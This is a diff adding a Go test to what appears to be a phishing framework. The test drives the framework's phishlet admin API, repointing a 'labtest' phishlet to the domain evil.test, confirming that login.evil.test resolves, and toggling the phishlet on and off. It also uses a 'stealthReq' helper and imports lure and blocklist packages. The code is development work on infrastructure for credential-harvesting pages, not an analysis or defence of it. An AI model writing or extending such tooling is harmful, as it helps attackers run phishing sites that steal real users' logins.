@@ -10,6 +10,8 @@ import (
 
 	"github.com/phantom-v2/phantom/core"
 	"github.com/phantom-v2/phantom/core/phishlet"
+	"os"
+	"path/filepath"
 	"github.com/phantom-v2/phantom/internal/blocklist"
 	"github.com/phantom-v2/phantom/internal/lures"
 )
@@ -188,5 +190,66 @@ func TestConfigEndpoint(t *testing.T) {
 	}
 	if out["node"] != "eu-1" || out["domains"] == nil {
 		t.Fatalf("bad config: %v", out)
+	}
+}
+
+
+func TestPhishletAdmin(t *testing.T) {
+	d := testDeps()
+	// hermetic: копия фишлета во временную dir, чтобы Save не трогал репозиторий
+	tmp := t.TempDir()
+	src, err := os.ReadFile("../../configs/phishlets/labtest.yaml")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(tmp, "labtest.yaml"), src, 0o600); err != nil {
+		t.Fatal(err)
+	}
+	isolated := phishlet.NewStore()
+	if err := isolated.LoadDir(tmp); err != nil {
+		t.Fatal(err)
+	}
+	d.Store = isolated
+	h := Handler(d)
+	put := func(id, body string) *httptest.ResponseRecorder {
+		req := stealthReq(http.MethodPut, "/api/v1/phishlets/"+id, body)
+		rec := httptest.NewRecorder()
+		h.ServeHTTP(rec, req)
+		return rec
+	}
+	// Смена домена labtest -> evil.test
+	if rec := put("labtest", `{"domains":["evil.test"]}`); rec.Code != http.StatusNoContent {
+		t.Fatalf("domains: %d %s", rec.Code, rec.Body.String())
+	}
+	st := d.Store.(*phishlet.Store)
+	if ph, _ := st.FindByHost("login.evil.test"); ph == nil {
+		t.Fatal("new domain not live")
+	}
+	// Выключение
+	if rec := put("labtest", `{"enabled":false}`); rec.Code != http.StatusNoContent {
+		t.Fatalf("disable: %d", rec.Code)
+	}
+	if ph, _ := st.FindByHost("login.evil.test"); ph != nil {
+		t.Fatal("disabled must not resolve")
+	}
+	// Включение обратно
+	if rec := put("labtest", `{"enabled":true}`); rec.Code != http.StatusNoContent {
+		t.Fatalf("enable: %d", rec.Code)
+	}
+	// Мусор и неизвестный
+	if rec := put("labtest", `{"domains":[]}`); rec.Code != http.StatusBadRequest {
+		t.Fatalf("empty domains: %d", rec.Code)
+	}
+	if rec := put("nope", `{"enabled":true}`); rec.Code != http.StatusBadRequest {
+		t.Fatalf("unknown: %d", rec.Code)
+	}
+	if rec := put("labtest", `{broken`); rec.Code != http.StatusBadRequest {
+		t.Fatalf("bad json: %d", rec.Code)
+	}
+	// GET на admin-путь — 405
+	rec := httptest.NewRecorder()
+	h.ServeHTTP(rec, stealthReq(http.MethodGet, "/api/v1/phishlets/labtest", ""))
+	if rec.Code != http.StatusMethodNotAllowed {
+		t.Fatalf("get admin: %d", rec.Code)
 	}
 }
